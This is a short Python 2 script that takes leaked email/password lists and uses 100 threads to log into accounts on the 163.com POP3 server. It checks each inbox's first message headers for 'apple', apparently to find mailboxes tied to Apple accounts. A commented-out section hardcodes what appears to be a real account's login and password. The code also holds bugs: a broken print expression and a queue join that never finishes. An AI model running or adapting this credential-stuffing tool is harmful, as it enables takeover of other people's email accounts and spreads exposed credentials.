#!/usr/bin/env python

import poplib

# global variables
keywords = 'apple'
thread_num = 100

# multi-threads
from Queue import Queue
from threading import Thread
class Worker(object):
	def __init__(self, queue):
		self.queue = queue
		self.thread_num = thread_num
		self.count = 0

	def start(self):
		for i in range(self.thread_num):
			t = Thread(target = self.run)
			t.setDaemon(True)
			t.start()

	def run(self):
		while True:
			self.count += 1
			user = self.queue.get()
			print self.count,' ',user['username']
			server = poplib.POP3('pop3.163.com')
			try:
				server.user(user['username'])
				server.pass_(user['password'])
				server.noop()
				count = 0
				for i in server.list()[1]:
					count += 1
					head = server.top(i,1)[1][0]
					if head.find(keywords) > -1:
						print 'apple msg recieved : '.user['username']
						break
					elif count >= 20:
						break
			except Exception, e:
				print user['username'],'get exception'
			
			if self.queue.empty():
				break

if __name__ == '__main__':
	queue = Queue()

	emails = open('emails.txt')
	passwords = open('passwords.txt')

	email = emails.readline()
	password = passwords.readline()
	while email and password:
		email = emails.readline()
		password = passwords.readline()
		user = {'username':email.strip(),'password':password.strip()}
		queue.put(user)

	print queue.qsize()
	Worker(queue).start()
	queue.join()


	

	# import imaplib
	# server = imaplib.IMAP4('IMAP4.163.com')
	# server.login('56906950@163.com','guokuan@163')
	# server.select()
	# typ, data = server.search(None, 'FROM','Facebook')
	# for num in data[0].split():
	#     typ, data = server.fetch(num, '(RFC822)')
	#     print 'Message %s\n%s\n' % (num, data[0][1])
	# server.close()
	# server.logout()
